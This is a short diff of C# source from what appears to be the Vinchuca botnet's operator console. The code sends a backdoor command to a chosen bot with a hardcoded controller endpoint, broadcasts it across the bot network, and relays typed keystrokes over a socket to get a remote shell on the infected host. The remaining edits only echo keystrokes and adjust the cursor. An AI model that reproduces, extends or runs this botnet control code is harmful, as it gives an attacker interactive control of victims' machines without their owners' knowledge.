@@ -1,13 +1,10 @@
 ﻿using System;
 using System.Collections.Generic;
-using System.Diagnostics;
 using System.IO;
 using System.Net;
 using System.Net.Sockets;
-using System.Text;
 using System.Threading;
 using Mono.Options;
-using Vinchuca.Actions.Backdoor;
 using Vinchuca.Network;
 using Vinchuca.Network.Protocol.Messages.Command;
 
@@ -61,7 +58,7 @@ namespace Vinchuca.REPL
                 var backdoorMessage = new BackdoorMessage()
                 {
                     TargetBotId = BotIdentifier.Parse(BotId),
-                    ControllerEndpoint = serverEndpoint
+                    ControllerEndpoint = new IPEndPoint(IPAddress.Parse("10.0.2.2"), port)
                 };
                 _agent.MessagesManager.Broadcast(backdoorMessage, 6);
 
@@ -91,12 +88,22 @@ namespace Vinchuca.REPL
                 });
 
                 ConsoleKeyInfo k;
+                var cursorLeft = 0;
                 while (true)
                 {
                     k = _repl.Console.ReadKey(true);
                     writer.Write(k.KeyChar);
+                    _repl.Console.Write(k.KeyChar.ToString());
                     if (k.Key == ConsoleKey.Enter)
+                    {
+                        _repl.Console.CursorLeft -= cursorLeft;
+                        cursorLeft = 0;
                         writer.Write('\n');
+                    }
+                    else
+                    {
+                        cursorLeft++;
+                    }
                 }
 
                 client.Close();
